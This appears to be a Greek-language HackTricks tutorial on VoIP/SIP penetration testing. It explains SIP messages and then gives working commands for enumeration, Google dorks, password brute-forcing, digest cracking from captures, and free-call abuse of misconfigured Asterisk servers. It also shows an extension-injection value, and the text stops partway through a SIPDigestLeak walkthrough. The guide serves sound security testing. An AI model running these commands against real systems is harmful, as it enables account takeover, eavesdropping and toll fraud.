# Ελεγχος Πέντε VoIP

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Red Team του HackTricks AWS)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**Την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>

## Βασικές Πληροφορίες VoIP

Για να ξεκινήσετε να μαθαίνετε πώς λειτουργεί το VoIP, ελέγξτε:

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}

## Βασικά Μηνύματα
```
Request name	Description								RFC references
------------------------------------------------------------------------------------------------------
REGISTER	Register a SIP user.							RFC 3261
INVITE		Initiate a dialog for establishing a call. 				RFC 3261
ACK		Confirm that an entity has received.					RFC 3261
BYE		Signal termination of a dialog and end a call.				RFC 3261
CANCEL		Cancel any pending request.						RFC 3261
UPDATE		Modify the state of a session without changing the state of the dialog.	RFC 3311
REFER		Ask recipient to issue a request for the purpose of call transfer.	RFC 3515
PRACK		Provisional acknowledgement.						RFC 3262
SUBSCRIBE	Initiates a subscription for notification of events from a notifier.	RFC 6665
NOTIFY		Inform a subscriber of notifications of a new event.			RFC 6665
PUBLISH		Publish an event to a notification server.				RFC 3903
MESSAGE		Deliver a text message.	Used in instant messaging applications.		RFC 3428
INFO		Send mid-session information that does not modify the session state.	RFC 6086
OPTIONS		Query the capabilities of an endpoint					RFC 3261
```
## Κωδικοί Απόκρισης

**1xx—Προσωρινές Αποκρίσεις**
```
100 Trying
180 Ringing
181 Call is Being Forwarded
182 Queued
183 Session Progress
199 Early Dialog Terminated
```
**2xx—Επιτυχημένες Απαντήσεις**
```
200 OK
202 Accepted
204 No Notification
```
**3xx—Απαντήσεις Ανακατεύθυνσης**
```
300 Multiple Choices
301 Moved Permanently
302 Moved Temporarily
305 Use Proxy
380 Alternative Service
```
**4xx—Αποκρίσεις Αποτυχίας Πελάτη**
```
400 Bad Request
401 Unauthorized
402 Payment Required
403 Forbidden
404 Not Found
405 Method Not Allowed
406 Not Acceptable
407 Proxy Authentication Required
408 Request Timeout
409 Conflict
410 Gone
411 Length Required
412 Conditional Request Failed
413 Request Entity Too Large
414 Request-URI Too Long
415 Unsupported Media Type
416 Unsupported URI Scheme
417 Unknown Resource-Priority
420 Bad Extension
421 Extension Required
422 Session Interval Too Small
423 Interval Too Brief
424 Bad Location Information
425 Bad Alert Message
428 Use Identity Header
429 Provide Referrer Identity
430 Flow Failed
433 Anonymity Disallowed
436 Bad Identity-Info
437 Unsupported Certificate
438 Invalid Identity Header
439 First Hop Lacks Outbound Support
440 Max-Breadth Exceeded
469 Bad Info Package
470 Consent Needed
480 Temporarily Unavailable
481 Call/Transaction Does Not Exist
482 Loop Detected
483 Too Many Hops
484 Address Incomplete
485 Ambiguous
486 Busy Here
487 Request Terminated
488 Not Acceptable Here
489 Bad Event
491 Request Pending
493 Undecipherable
494 Security Agreement Required
```
**5xx—Αποκρίσεις Αποτυχίας Διακομιστή**
```
500 Internal Server Error
501 Not Implemented
502 Bad Gateway
503 Service Unavailable
504 Server Time-out
505 Version Not Supported
513 Message Too Large
555 Push Notification Service Not Supported
580 Precondition Failure
```
**6xx—Απαντήσεις Παγκόσμιας Αποτυχίας**
```
600 Busy Everywhere
603 Decline
604 Does Not Exist Anywhere
606 Not Acceptable
607 Unwanted
608 Rejected
```
## Απαρίθμηση VoIP

### Τηλεφωνικοί Αριθμοί

Ένα από τα πρώτα βήματα που μπορεί να κάνει μια Κόκκινη Ομάδα είναι να αναζητήσει διαθέσιμους τηλεφωνικούς αριθμούς για επικοινωνία με την εταιρεία χρησιμοποιώντας εργαλεία OSINT, αναζητήσεις στο Google ή scraping τις ιστοσελίδες.

Αφού έχετε τους τηλεφωνικούς αριθμούς, μπορείτε να χρησιμοποιήσετε online υπηρεσίες για να αναγνωρίσετε τον πάροχο:

* [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
* [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
* [https://www.whitepages.com/](https://www.whitepages.com/)
* [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

Γνωρίζοντας αν ο πάροχος παρέχει υπηρεσίες VoIP μπορείτε να αναγνωρίσετε αν η εταιρεία χρησιμοποιεί VoIP... Επιπλέον, είναι πιθανό ότι η εταιρεία δεν έχει νοικιάσει υπηρεσίες VoIP αλλά χρησιμοποιεί κάρτες PSTN για να συνδέσει το δικό της VoIP PBX με το παραδοσιακό τηλεφωνικό δίκτυο.

Πράγματα όπως οι αυτοματοποιημένες απαντήσεις με μουσική συνήθως υποδηλώνουν ότι χρησιμοποιείται VoIP.

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### Πληροφορίες OSINT

Οποιαδήποτε άλλη αναγνώριση OSINT που βοηθά στην ταυτοποίηση του λογισμικού VoIP που χρησιμοποιείται θα είναι χρήσιμη για μια Ομάδα Ερυθράς.

### Απαρίθμηση Δικτύου

* **`nmap`** είναι ικανό να σαρώνει υπηρεσίες UDP, αλλά λόγω του μεγάλου αριθμού υπηρεσιών UDP που σαρώνονται, είναι πολύ αργό και ενδέχεται να μην είναι πολύ ακριβές με αυτού του είδους τις υπηρεσίες.
```bash
sudo nmap --script=sip-methods -sU -p 5060 10.10.0.0/24
```
* **`svmap`** από το SIPVicious (`sudo apt install sipvicious`): Θα εντοπίσει τις υπηρεσίες SIP στο δίκτυο που υποδεικνύετε.
* Το `svmap` είναι **εύκολο να αποκλειστεί** επειδή χρησιμοποιεί το User-Agent `friendly-scanner`, αλλά μπορείτε να τροποποιήσετε τον κώδικα από το `/usr/share/sipvicious/sipvicious` και να το αλλάξετε.
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`SIPPTS scan`** από [**sippts**](https://github.com/Pepelux/sippts)**:** Το SIPPTS scan είναι ένα πολύ γρήγορο εργαλείο σάρωσης για υπηρεσίες SIP μέσω UDP, TCP ή TLS. Χρησιμοποιεί πολλά νήματα και μπορεί να σαρώσει μεγάλους εύρους δικτύων. Επιτρέπει την εύκολη υποδειξη εύρους θυρών, σάρωση και TCP & UDP, χρήση ενός άλλου μεθόδου (από προεπιλογή θα χρησιμοποιήσει το OPTIONS) και καθορισμό διαφορετικού User-Agent (και άλλα).
```bash
sippts scan -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200
```
* **metasploit**: 

```plaintext
* **metasploit**:
```
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### Επιπρόσθετη Απαρίθμηση Δικτύου

Το PBX θα μπορούσε επίσης να εκθέτει άλλες υπηρεσίες δικτύου όπως:

- **69/UDP (TFTP)**: Ενημερώσεις Firmware
- **80 (HTTP) / 443 (HTTPS)**: Για τη διαχείριση της συσκευής από το web
- **389 (LDAP)**: Εναλλακτική αποθήκευση πληροφοριών χρηστών
- **3306 (MySQL)**: Βάση δεδομένων MySQL
- **5038 (Manager)**: Επιτρέπει τη χρήση του Asterisk από άλλες πλατφόρμες
- **5222 (XMPP)**: Μηνύματα χρησιμοποιώντας το Jabber
- **5432 (PostgreSQL)**: Βάση δεδομένων PostgreSQL
- Και άλλα...

### Απαρίθμηση Μεθόδων

Είναι δυνατόν να βρεθούν **ποιες μέθοδοι είναι διαθέσιμες** για χρήση στο PBX χρησιμοποιώντας το `SIPPTS enumerate` από το [**sippts**](https://github.com/Pepelux/sippts)
```bash
sippts enumerate -i 10.10.0.10
```
### Ανάλυση απαντήσεων διακομιστή

Είναι πολύ σημαντικό να αναλύουμε τις κεφαλίδες που ένας διακομιστής μας στέλνει, ανάλογα με τον τύπο του μηνύματος και τις κεφαλίδες που στέλνουμε. Με την εντολή `SIPPTS send` από το [**sippts**](https://github.com/Pepelux/sippts) μπορούμε να στείλουμε εξατομικευμένα μηνύματα, να παραποιήσουμε όλες τις κεφαλίδες και να αναλύσουμε την απάντηση.
```bash
sippts send -i 10.10.0.10 -m INVITE -ua Grandstream -fu 200 -fn Bob -fd 11.0.0.1 -tu 201 -fn Alice -td 11.0.0.2 -header "Allow-Events: presence" -sdp
```
Είναι επίσης δυνατόν να ληφθούν δεδομένα εάν ο διακομιστής χρησιμοποιεί websockets. Με την εντολή `SIPPTS wssend` από το [**sippts**](https://github.com/Pepelux/sippts) μπορούμε να στείλουμε εξατομικευμένα μηνύματα WS.
```bash
sippts wssend -i 10.10.0.10 -r 443 -path /ws
```
### Απαρίθμηση Επεκτάσεων

Οι επεκτάσεις σε ένα σύστημα PBX (Ιδιωτικό Ανταλλαγής Κλάδων) αναφέρονται στα **μοναδικά εσωτερικά αναγνωριστικά που ανατίθενται σε μεμονωμένες** γραμμές τηλεφώνου, συσκευές ή χρήστες εντός μιας οργάνωσης ή επιχείρησης. Οι επεκτάσεις καθιστούν δυνατή τη **δρομολόγηση κλήσεων εντός της οργάνωσης με αποτελεσματικό τρόπο**, χωρίς την ανάγκη για μεμονωμένους εξωτερικούς αριθμούς τηλεφώνου για κάθε χρήστη ή συσκευή.

* **`svwar`** από το SIPVicious (`sudo apt install sipvicious`): Το `svwar` είναι ένα δωρεάν εργαλείο σάρωσης γραμμής επέκτασης SIP PBX. Στην έννοια λειτουργεί παρόμοια με τους παραδοσιακούς wardialers με το **να μαντεύει ένα εύρος επεκτάσεων ή μια δεδομένη λίστα επεκτάσεων**.
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`SIPPTS exten`** από [**sippts**](https://github.com/Pepelux/sippts)**:** Το SIPPTS exten αναγνωρίζει τις επεκτάσεις σε ένα διακομιστή SIP. Το Sipexten μπορεί να ελέγξει μεγάλους δικτυακούς και εύρους θυρών.
```bash
sippts exten -i 10.10.0.10 -r 5060 -e 100-200
```
* **metasploit**: Μπορείτε επίσης να απαριθμήσετε τις επεκτάσεις/ονόματα χρηστών με το metasploit:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX** είναι ένα εργαλείο απαρίθμησης ονομάτων χρηστών πρωτοκόλλου Inter Asterisk Exchange (IAX). Το enumIAX μπορεί να λειτουργήσει σε δύο διακριτές λειτουργίες. Είτε σε Σειριακή Μάντεψη Ονομάτων Χρηστών είτε σε Επίθεση Λεξικού.
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## Επιθέσεις VoIP

### Επίθεση Βίας στον Κωδικό Πρόσβασης - online

Αφού ανακαλύψει το **PBX** και μερικά **επεκτάσεις/ονόματα χρηστών**, μια Κόκκινη Ομάδα μπορεί να προσπαθήσει να **πιστοποιηθεί μέσω της μεθόδου `REGISTER`** σε μια επέκταση χρησιμοποιώντας ένα λεξικό με κοινούς κωδικούς πρόσβασης για να εκτελέσει βίαιη επίθεση στην πιστοποίηση.

{% hint style="danger" %}
Σημειώστε ότι ένα **όνομα χρήστη** μπορεί να είναι το ίδιο με την επέκταση, αλλά αυτή η πρακτική μπορεί να διαφέρει ανάλογα με το σύστημα PBX, τη διαμόρφωσή του και τις προτιμήσεις του οργανισμού...

Αν το όνομα χρήστη δεν είναι το ίδιο με την επέκταση, θα πρέπει να **ανακαλύψετε το όνομα χρήστη για να εκτελέσετε βίαιη επίθεση σε αυτό**.
{% endhint %}

* **`svcrack`** από το SIPVicious (`sudo apt install sipvicious`): Το SVCrack σάς επιτρέπει να σπάσετε τον κωδικό πρόσβασης για ένα συγκεκριμένο όνομα χρήστη/επέκταση σε ένα PBX.
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`SIPPTS rcrack`** από [**sippts**](https://github.com/Pepelux/sippts)**:** Το SIPPTS rcrack είναι ένα απομακρυσμένο εργαλείο χρήσης κωδικών πρόσβασης για υπηρεσίες SIP. Το Rcrack μπορεί να ελέγξει κωδικούς πρόσβασης για πολλούς χρήστες σε διαφορετικές διευθύνσεις IP και εύρημα θυρών.
```bash
sippts rcrack -i 10.10.0.10 -e 100,101,103-105 -w wordlist/rockyou.txt
```
* **Metasploit**:
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb)

### Καταγραφή VoIP

Εάν βρείτε εξοπλισμό VoIP μέσα σε ένα **Ανοιχτό δίκτυο Wifi**, μπορείτε να **καταγράψετε όλες τις πληροφορίες**. Επιπλέον, αν βρίσκεστε μέσα σε ένα πιο κλειστό δίκτυο (συνδεδεμένοι μέσω Ethernet ή προστατευμένου Wifi) μπορείτε να εκτελέσετε επιθέσεις **MitM όπως** [**ARPspoofing**](../../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) μεταξύ του **PBX και της πύλης** για να καταγράψετε τις πληροφορίες.

Ανάμεσα στις πληροφορίες του δικτύου, μπορείτε να βρείτε **διαπιστευτήρια ιστοσελίδας** για τη διαχείριση του εξοπλισμού, **επεκτάσεις χρηστών**, **όνομα χρήστη**, **διευθύνσεις IP**, ακόμη και **κρυπτογραφημένους κωδικούς πρόσβασης** και **πακέτα RTP** που μπορείτε να αναπαράγετε για να **ακούσετε τη συνομιλία**, και άλλα.

Για να λάβετε αυτές τις πληροφορίες μπορείτε να χρησιμοποιήσετε εργαλεία όπως το Wireshark, tcpdump... αλλά ένα **ειδικά δημιουργημένο εργαλείο για την καταγραφή συνομιλιών VoIP είναι το** [**ucsniff**](https://github.com/Seabreg/ucsniff).

{% hint style="danger" %}
Σημειώστε ότι αν χρησιμοποιείται **TLS στην επικοινωνία SIP** δεν θα μπορείτε να δείτε την επικοινωνία SIP με σαφήνεια.\
Το ίδιο θα συμβεί αν χρησιμοποιούνται **SRTP** και **ZRTP**, τα **πακέτα RTP δεν θα είναι σε καθαρό κείμενο**.
{% endhint %}

#### Διαπιστευτήρια SIP (Επίθεση Brute-Force κωδικού - εκτός σύνδεσης)

[Ελέγξτε αυτό το παράδειγμα για να καταλάβετε καλύτερα μια **επικοινωνία εγγραφής SIP**](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example) για να μάθετε πώς **αποστέλλονται τα διαπιστευτήρια**.

* **`sipdump`** & **`sipcrack`,** μέρος του **sipcrack** (`apt-get install sipcrack`): Αυτά τα εργαλεία μπορούν να **εξάγουν** από ένα **pcap** τις **διαπιστεύσεις διακριτικού** μέσα στο πρωτόκολλο SIP και να τις **εξαναγκάσουν**.
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`SIPPTS dump`** από [**sippts**](https://github.com/Pepelux/sippts)**:** Το SIPPTS dump μπορεί να εξάγει πιστοποιήσεις διαχύτη από ένα αρχείο pcap.
```bash
sippts dump -f capture.pcap -o data.txt
```
* **`SIPPTS dcrack`** από [**sippts**](https://github.com/Pepelux/sippts)**:** Το SIPPTS dcrack είναι ένα εργαλείο για να αποκρυπτογραφήσετε τις διαπιστεύσεις που λαμβάνονται με το SIPPTS dump.
```bash
sippts dcrack -f data.txt -w wordlist/rockyou.txt
```
* **`SIPPTS tshark`** από [**sippts**](https://github.com/Pepelux/sippts)**:** Το SIPPTS tshark εξάγει δεδομένα του πρωτοκόλλου SIP από ένα αρχείο PCAP.
```bash
sippts tshark -f capture.pcap [-filter auth]
```
#### Κωδικοί DTMF

**Δεν είναι μόνο τα διαπιστευτήρια SIP** που μπορούν να βρεθούν στην κίνηση του δικτύου, είναι επίσης δυνατόν να βρεθούν κωδικοί DTMF οι οποίοι χρησιμοποιούνται για παράδειγμα για την πρόσβαση στο **ταχυδρομείο φωνητικών μηνυμάτων**.\
Είναι δυνατόν να σταλούν αυτοί οι κωδικοί σε **μηνύματα INFO SIP**, σε **ήχο** ή μέσα σε **πακέτα RTP**. Αν οι κωδικοί βρίσκονται μέσα σε πακέτα RTP, μπορείτε να αποκόψετε αυτό το τμήμα της συνομιλίας και να χρησιμοποιήσετε το εργαλείο multimo για να τους εξάγετε:
```bash
multimon -a DTMF -t wac pin.wav
```
### Σφάλματα Διαμόρφωσης Συνδέσεων Δωρεάν Κλήσεων / Σύνδεσης Asterisks

Στο Asterisk είναι δυνατόν να επιτραπεί μια σύνδεση **από μια συγκεκριμένη διεύθυνση IP** ή από **οποιαδήποτε διεύθυνση IP**:
```
host=10.10.10.10
host=dynamic
```
Εάν καθοριστεί μια διεύθυνση IP, το σύστημα **δεν θα χρειαστεί να στέλνει αιτήματα REGISTER** κάθε λίγο και λίγο (στο πακέτο REGISTER στέλνεται ο χρόνος ζωής, συνήθως 30 λεπτά, που σημαίνει ότι σε άλλη περίπτωση το τηλέφωνο θα χρειαστεί να κάνει REGISTER κάθε 30 λεπτά). Ωστόσο, θα πρέπει να έχει ανοιχτές θύρες που επιτρέπουν συνδέσεις από το διακομιστή VoIP για να δέχεται κλήσεις.

Για να οριστούν οι χρήστες, μπορούν να οριστούν ως:

* **`type=user`**: Ο χρήστης μπορεί μόνο να λαμβάνει κλήσεις ως χρήστης.
* **`type=friend`**: Είναι δυνατή η πραγματοποίηση κλήσεων ως peer και η λήψη τους ως χρήστης (χρησιμοποιείται με επεκτάσεις)
* **`type=peer`**: Είναι δυνατή η αποστολή και λήψη κλήσεων ως peer (SIP-trunks)

Είναι επίσης δυνατή η εγκαθίδρυση εμπιστοσύνης με τη μεταβλητή ανασφάλειας:

* **`insecure=port`**: Επιτρέπει συνδέσεις peer που επικυρώνονται από τη διεύθυνση IP.
* **`insecure=invite`**: Δεν απαιτείται πιστοποίηση για μηνύματα INVITE
* **`insecure=port,invite`**: Και τα δύο

{% hint style="warning" %}
Όταν χρησιμοποιείται **`type=friend`**, η **τιμή** της μεταβλητής **host** **δεν θα χρησιμοποιηθεί**, οπότε αν ένας διαχειριστής **διαμορφώσει λανθασμένα ένα SIP-trunk** χρησιμοποιώντας αυτήν την τιμή, **οποιοσδήποτε θα μπορεί να συνδεθεί σε αυτό**.

Για παράδειγμα, αυτή η διαμόρφωση θα ήταν ευάλωτη:\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### Δωρεάν Κλήσεις / Λανθασμένες Ρυθμίσεις Πλαισίου Asterisk

Στο Asterisk ένα **context** είναι ένα ονομασμένο δοχείο ή τμήμα στο σχέδιο κλήσης που **συγκεντρώνει σχετικές επεκτάσεις, ενέργειες και κανόνες**. Το σχέδιο κλήσης είναι το κύριο συστατικό ενός συστήματος Asterisk, καθώς ορίζει **πώς χειρίζονται και δρομολογούνται οι εισερχόμενες και εξερχόμενες κλήσεις**. Τα context χρησιμοποιούνται για την οργάνωση του σχεδίου κλήσης, τη διαχείριση του ελέγχου πρόσβασης και την παροχή διαχωρισμού μεταξύ διαφορετικών τμημάτων του συστήματος.

Κάθε context ορίζεται στο αρχείο ρυθμίσεων, συνήθως στο αρχείο **`extensions.conf`**. Τα context δηλώνονται με αγκύλες, με το όνομα του context που περικλείεται μέσα σε αυτές. Για παράδειγμα:
```bash
csharpCopy code[my_context]
```
Μέσα στο πλαίσιο, ορίζετε επεκτάσεις (πρότυπα κλήσης αριθμών) και τις συσχετίζετε με μια σειρά από ενέργειες ή εφαρμογές. Αυτές οι ενέργειες καθορίζουν πώς θα επεξεργαστείτε την κλήση. Για παράδειγμα:
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
Αυτό το παράδειγμα δείχνει ένα απλό context που ονομάζεται "my\_context" με μια επέκταση "100". Όταν κάποιος καλεί το 100, η κλήση θα απαντηθεί, θα ακουστεί ένα μήνυμα καλωσορίσματος και στη συνέχεια η κλήση θα τερματιστεί.

Αυτός είναι **ένας άλλος context** που επιτρέπει τη **κλήση προς οποιονδήποτε άλλο αριθμό**:
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
Εάν ο διαχειριστής ορίζει το **προεπιλεγμένο πλαίσιο** ως:
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
Οποιοσδήποτε θα μπορεί να χρησιμοποιήσει τον **server για να καλέσει οποιονδήποτε άλλο αριθμό** (και ο διαχειριστής του server θα πληρώσει για την κλήση).
{% endhint %}

{% hint style="danger" %}
Επιπλέον, από προεπιλογή το αρχείο **`sip.conf`** περιέχει **`allowguest=true`**, οπότε **οποιοσδήποτε** επιτιθέμενος χωρίς **ταυτοποίηση** θα μπορεί να καλέσει οποιονδήποτε άλλο αριθμό.
{% endhint %}

*   **`SIPPTS invite`** από το [**sippts**](https://github.com/Pepelux/sippts)**:** Το SIPPTS invite ελέγχει αν ένα **PBX server μας επιτρέπει να κάνουμε κλήσεις χωρίς ταυτοποίηση**. Αν ο SIP server έχει μη σωστή ρύθμιση, θα μας επιτρέψει να κάνουμε κλήσεις προς εξωτερικούς αριθμούς. Μπορεί επίσης να μας επιτρέψει να μεταφέρουμε την κλήση σε έναν δεύτερο εξωτερικό αριθμό.

Για παράδειγμα, αν ο διακομιστής Asterisk σας έχει μια κακή ρύθμιση περιβάλλοντος, μπορεί να δέχεται αιτήματα INVITE χωρίς εξουσιοδότηση. Σε αυτήν την περίπτωση, ένας επιτιθέμενος μπορεί να κάνει κλήσεις χωρίς να γνωρίζει κάποιο όνομα χρήστη/κωδικό.
{% code overflow="wrap" %}
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
sippts invite -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
sippts invite -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### Δωρεάν κλήσεις / Λανθασμένα ρυθμισμένο IVRS

Το IVRS σημαίνει **Διαδραστικό Σύστημα Ανταπόκρισης Φωνής**, μια τεχνολογία τηλεφωνίας που επιτρέπει στους χρήστες να αλληλεπιδρούν με ένα υπολογιστικό σύστημα μέσω φωνητικών ή αφής εισόδων. Το IVRS χρησιμοποιείται για τη δημιουργία συστημάτων **αυτοματοποιημένης χειρισμού κλήσεων** που προσφέρουν μια σειρά λειτουργιών, όπως παροχή πληροφοριών, δρομολόγηση κλήσεων και καταγραφή εισόδου χρήστη.

Το IVRS στα συστήματα VoIP αποτελείται τυπικά από:

1. **Φωνητικές οδηγίες**: Προ-εγγεγραμμένα ηχητικά μηνύματα που καθοδηγούν τους χρήστες μέσω των επιλογών και οδηγιών του μενού IVR.
2. **DTMF** (Διπλής Τόνου Πολυσυχνότητα) σήμανση: Εισόδοι αφής που παράγονται πατώντας πλήκτρα στο τηλέφωνο, τα οποία χρησιμοποιούνται για την πλοήγηση μέσω των μενού IVR και την παροχή εισόδου.
3. **Δρομολόγηση κλήσεων**: Κατευθύνοντας κλήσεις προς τον κατάλληλο προορισμό, όπως συγκεκριμένα τμήματα, πράκτορες ή επεκτάσεις με βάση την είσοδο του χρήστη.
4. **Καταγραφή εισόδου χρήστη**: Συλλογή πληροφοριών από τους καλούντες, όπως αριθμούς λογαριασμών, αναγνωριστικά περιστατικών ή οποιαδήποτε άλλα σχετικά δεδομένα.
5. **Ενσωμάτωση με εξωτερικά συστήματα**: Σύνδεση του συστήματος IVR με βάσεις δεδομένων ή άλλα λογισμικά συστήματα για πρόσβαση ή ενημέρωση πληροφοριών, εκτέλεση ενεργειών ή ενεργοποίηση συμβάντων.

Σε ένα σύστημα VoIP Asterisk, μπορείτε να δημιουργήσετε ένα IVR χρησιμοποιώντας το σχέδιο κλήσης (**αρχείο `extensions.conf`**) και διάφορες εφαρμογές όπως `Background()`, `Playback()`, `Read()` και άλλες. Αυτές οι εφαρμογές σας βοηθούν να αναπαράγετε φωνητικές οδηγίες, να καταγράφετε την είσοδο του χρήστη και να ελέγχετε τη ροή της κλήσης.

#### Παράδειγμα ευάλωτης διαμόρφωσης
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
Το προηγούμενο είναι ένα παράδειγμα όπου ο χρήστης καλείται να **πατήσει 1 για να καλέσει** ένα τμήμα, **2 για να καλέσει** ένα άλλο, ή **την πλήρη επέκταση** αν την γνωρίζει.\
Η ευπάθεια είναι το γεγονός ότι το **μήκος της επέκτασης δεν ελέγχεται, έτσι ένας χρήστης θα μπορούσε να εισάγει κατά τη διάρκεια της περιόδου αναμονής 5 δευτερολέπτων έναν πλήρη αριθμό και αυτός θα κληθεί.**

### Εισαγωγή Επέκτασης

Χρησιμοποιώντας μια επέκταση όπως:
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
Όπου **`${EXTEN}`** είναι η **επέκταση** που θα κληθεί, όταν εισαχθεί η **ext 101** αυτό είναι το που θα συμβεί:
```scss
exten => 101,1,Dial(SIP/101)
```
Ωστόσο, αν το **`${EXTEN}`** επιτρέπει την εισαγωγή **περισσότερων από αριθμούς** (όπως σε παλαιότερες εκδόσεις του Asterisk), ένας επιτιθέμενος θα μπορούσε να εισάγει **`101&SIP123123123`** για να καλέσει τον αριθμό τηλεφώνου 123123123. Και αυτό θα ήταν το αποτέλεσμα:
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
Επομένως, ένα κάλεσμα στην επέκταση **`101`** και **`123123123`** θα σταλεί και μόνο ο πρώτος που θα λάβει το κάλεσμα θα εγκαθιδρυθεί... αλλά αν ένας εισβολέας χρησιμοποιήσει μια **επέκταση που παρακάμπτει οποιαδήποτε αντιστοίχιση** που πραγματοποιείται αλλά δεν υπάρχει, θα μπορούσε να **ενθάρρυνει ένα κάλεσμα μόνο στο επιθυμητό νούμερο**.

## Ευπάθεια SIPDigestLeak

Η διαρροή του SIP Digest είναι μια ευπάθεια που επηρεάζει ένα μεγάλο αριθμό των SIP τηλεφώνων, συμπεριλαμβανομένων τόσο των υλικού όσο και των λογισμικού IP τηλεφώνων καθώς και των προσαρμογέων τηλεφώνου (VoIP σε αναλογικό). Η ευπάθεια επιτρέπει τη **διαρροή της απάντησης πιστοποίησης Digest**, η οποία υπολογίζεται από τον κωδικό πρόσβασης. Ένας **επίθετης εκτός σύνδεσης επίθεσης κωδικού πρόσβασης είναι τότε δυνατός** και μπορεί να ανακτήσει τους περισσότερους κωδικούς πρόσβασης με βάση την απάντηση πρόκλησης.

**[Σενάριο ευπάθειας από εδώ**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. Ένα IP τηλέφωνο (θύμα) ακούει σε οποιαδήποτε θύρα (για παράδειγμα: 5060), δέχεται τηλεφωνικές κλήσεις
2. Ο εισβολέας στέλνει ένα INVITE στο IP τηλέφωνο
3. Το τηλέφωνο θύμα αρχίζει να χτυπάει και κάποιος απαντά και κλείνει το τηλέφωνο (επειδή κανείς δεν απαντά στο άλλο άκρο)
